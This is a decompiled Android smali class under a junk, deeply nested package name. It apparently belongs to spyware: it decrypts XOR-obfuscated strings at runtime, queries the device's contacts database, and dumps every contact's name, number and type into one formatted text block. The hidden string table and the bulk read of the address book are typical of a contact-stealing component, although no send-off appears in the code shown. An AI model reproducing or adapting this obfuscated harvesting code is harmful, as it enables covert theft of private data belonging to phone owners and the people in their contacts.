.class public abstract Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/wc;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public static a(Landroid/content/Context;)Ljava/lang/String;
    .locals 14

    .line 1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/16 p0, 0x32

    new-array p0, p0, [B

    fill-array-data p0, :array_0

    const/16 v7, 0x8

    new-array v4, v7, [B

    fill-array-data v4, :array_1

    invoke-static {p0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/4 p0, 0x2

    new-array v5, p0, [Ljava/lang/String;

    const/16 v6, 0x20

    new-array v8, v6, [B

    fill-array-data v8, :array_2

    new-array v9, v7, [B

    fill-array-data v9, :array_3

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    aput-object v8, v5, v9

    new-array v6, v6, [B

    fill-array-data v6, :array_4

    new-array v8, v7, [B

    fill-array-data v8, :array_5

    invoke-static {v6, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v8, 0x1

    aput-object v6, v5, v8

    const/16 v10, 0xa

    new-array v6, v10, [B

    fill-array-data v6, :array_6

    new-array v11, v7, [B

    fill-array-data v11, :array_7

    invoke-static {v6, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-lez v2, :cond_4

    :cond_0
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_3

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_8

    new-array v3, v7, [B

    fill-array-data v3, :array_9

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_0

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_0

    const/4 v3, 0x4

    new-array v4, v3, [B

    fill-array-data v4, :array_a

    new-array v5, v7, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_0

    const/16 v4, 0xc

    new-array v4, v4, [B

    fill-array-data v4, :array_c

    new-array v5, v7, [B

    fill-array-data v5, :array_d

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0x19

    new-array v5, v5, [B

    fill-array-data v5, :array_e

    new-array v6, v7, [B

    fill-array-data v6, :array_f

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    new-array v6, v10, [B

    fill-array-data v6, :array_10

    new-array v11, v7, [B

    fill-array-data v11, :array_11

    invoke-static {v6, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getInt(I)I

    move-result v6

    const/16 v11, 0x3d

    new-array v11, v11, [B

    fill-array-data v11, :array_12

    new-array v12, v7, [B

    fill-array-data v12, :array_13

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v12, 0x6

    if-eqz v4, :cond_1

    goto :goto_1

    :cond_1
    new-array v4, v12, [B

    fill-array-data v4, :array_14

    new-array v13, v7, [B

    fill-array-data v13, :array_15

    invoke-static {v4, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    :goto_1
    aput-object v4, v3, v9

    aput-object v2, v3, v8

    if-eqz v5, :cond_2

    goto :goto_2

    :cond_2
    new-array v2, v12, [B

    fill-array-data v2, :array_16

    new-array v4, v7, [B

    fill-array-data v4, :array_17

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    :goto_2
    aput-object v5, v3, p0

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v4, 0x3

    aput-object v2, v3, v4

    invoke-static {v11, v3}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\n"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto/16 :goto_0

    :catch_0
    move-exception p0

    goto :goto_3

    :cond_3
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    :cond_4
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :goto_3
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    const-string p0, ""

    :goto_4
    return-object p0

    nop

    :array_0
    .array-data 1
        -0x56t
        -0x1et
        0x46t
        -0x62t
        0x5ct
        0x42t
        0x38t
        0xat
        -0x59t
        -0x24t
        0x5bt
        -0x4ct
        0x41t
        0x48t
        0x32t
        0x16t
        -0x1dt
        -0x42t
        0x5t
        -0x1ft
        0x6dt
        0x64t
        0x13t
        0x44t
        -0x16t
        -0x12t
        0x5ct
        -0x54t
        0x49t
        0x5et
        0x2et
        0x14t
        -0x59t
        -0x42t
        0xat
        -0x1ft
        0x63t
        0x78t
        0x77t
        0x9t
        -0x55t
        -0x12t
        0x50t
        -0x4bt
        0x55t
        0x5at
        0x32t
        0x59t
        -0x3t
        -0x56t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x3et
        -0x7dt
        0x35t
        -0x3ft
        0x2ct
        0x2at
        0x57t
        0x64t
    .end array-data

    :array_2
    .array-data 1
        0x27t
        -0x5t
        -0x15t
        -0x11t
        0x21t
        -0x21t
        0x41t
        0x5t
        0x3et
        -0x4t
        -0x15t
        -0x11t
        0x23t
        -0x3ct
        0x57t
        0x4t
        0x3et
        -0x19t
        -0x5ft
        -0x58t
        0x34t
        -0x2ct
        0x48t
        0x58t
        0x34t
        -0x8t
        -0x12t
        -0x58t
        0x2ct
        -0x12t
        0x53t
        0x45t
    .end array-data

    :array_3
    .array-data 1
        0x51t
        -0x6bt
        -0x71t
        -0x3ft
        0x40t
        -0x4ft
        0x25t
        0x77t
    .end array-data

    :array_4
    .array-data 1
        -0x4dt
        -0x33t
        0x22t
        -0x16t
        0x2dt
        -0x1et
        0x39t
        0x79t
        -0x56t
        -0x36t
        0x22t
        -0x16t
        0x2ft
        -0x7t
        0x2ft
        0x78t
        -0x56t
        -0x2ft
        0x68t
        -0x53t
        0x38t
        -0x17t
        0x30t
        0x24t
        -0x4bt
        -0x35t
        0x29t
        -0x56t
        0x29t
        -0x2dt
        0x2bt
        0x39t
    .end array-data

    :array_5
    .array-data 1
        -0x3bt
        -0x5dt
        0x46t
        -0x3ct
        0x4ct
        -0x74t
        0x5dt
        0xbt
    .end array-data

    :array_6
    .array-data 1
        -0x74t
        -0x37t
        -0x3ft
        -0x19t
        -0x21t
        -0x11t
        0x7ft
        0x75t
        -0x7at
        -0x3et
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x11t
        -0x5at
        -0x51t
        -0x6dt
        -0x42t
        -0x74t
        0xbt
        0x2at
    .end array-data

    :array_8
    .array-data 1
        -0x28t
        -0x4t
        -0xdt
        -0x36t
        -0x59t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x44t
        -0x63t
        -0x79t
        -0x55t
        -0x6at
        -0x76t
        -0x6ct
        0x56t
    .end array-data

    :array_a
    .array-data 1
        0x67t
        -0x36t
        -0x4bt
        0x58t
    .end array-data

    :array_b
    .array-data 1
        0x9t
        -0x41t
        -0x27t
        0x34t
        0x67t
        -0x68t
        0x6et
        -0x26t
    .end array-data

    :array_c
    .array-data 1
        -0x75t
        -0x34t
        -0x75t
        0x20t
        0x39t
        0x6ft
        0x3bt
        -0x21t
        -0x7ft
        -0x3ct
        -0x6bt
        0x35t
    .end array-data

    :array_d
    .array-data 1
        -0x11t
        -0x5bt
        -0x8t
        0x50t
        0x55t
        0xet
        0x42t
        -0x80t
    .end array-data

    :array_e
    .array-data 1
        0xbt
        -0x55t
        0x6ct
        0x66t
        0x54t
        0x18t
        0x5dt
        0x1ct
        0x1et
        -0x4ft
        0x7ft
        0x6ct
        0x7et
        0x17t
        0x47t
        0x27t
        0x35t
        -0x54t
        0x6et
        0x7dt
        0x40t
        0x29t
        0x5at
        0x26t
        0x1et
    .end array-data

    nop

    :array_f
    .array-data 1
        0x6at
        -0x38t
        0xft
        0x9t
        0x21t
        0x76t
        0x29t
        0x43t
    .end array-data

    :array_10
    .array-data 1
        0x7ft
        0xat
        0x6ft
        0x40t
        -0x26t
        0x79t
        -0x5dt
        0x5et
        0x75t
        0x1t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x1ct
        0x65t
        0x1t
        0x34t
        -0x45t
        0x1at
        -0x29t
        0x1t
    .end array-data

    :array_12
    .array-data 1
        0x16t
        -0x7dt
        0x16t
        0x7ct
        -0x58t
        -0x6bt
        0x69t
        0x4ct
        0x4ft
        -0x7ct
        0xbt
        0x3ft
        -0x17t
        -0x30t
        0x69t
        0x18t
        0x18t
        -0x34t
        0x1at
        0x78t
        -0x49t
        -0x2et
        0x71t
        0x54t
        0x48t
        -0x2et
        0x5at
        0x31t
        -0x1bt
        -0x2et
        0x28t
        0x19t
        0x3t
        -0x31t
        0x1dt
        0x7et
        -0x4ft
        -0x6bt
        0x2ft
        0x29t
        0x1bt
        -0x38t
        0x19t
        0x3ft
        -0x1t
        -0x2et
        0x6et
        0x5t
        0x4ft
        -0x73t
        0x58t
        0x3ft
        -0x54t
        -0x6ct
        0x69t
        0x4ct
        0x4ft
        -0x7ct
        0x1ct
        0x3ft
        -0x48t
    .end array-data

    nop

    :array_13
    .array-data 1
        0x6dt
        -0x5ft
        0x78t
        0x1dt
        -0x3bt
        -0x10t
        0x4bt
        0x76t
    .end array-data

    :array_14
    .array-data 1
        0x66t
        0x54t
        -0x76t
        -0x2ct
        0x28t
        -0x58t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x80t
        -0x38t
        0x20t
        0x33t
        -0x49t
        0xdt
        0x6ct
        0x46t
    .end array-data

    :array_16
    .array-data 1
        -0x2ft
        -0x19t
        -0x58t
        -0x34t
        -0x27t
        -0x16t
    .end array-data

    nop

    :array_17
    .array-data 1
        0x37t
        0x7bt
        0x2t
        0x2bt
        0x46t
        0x4ft
        -0x41t
        -0x4t
    .end array-data
.end method
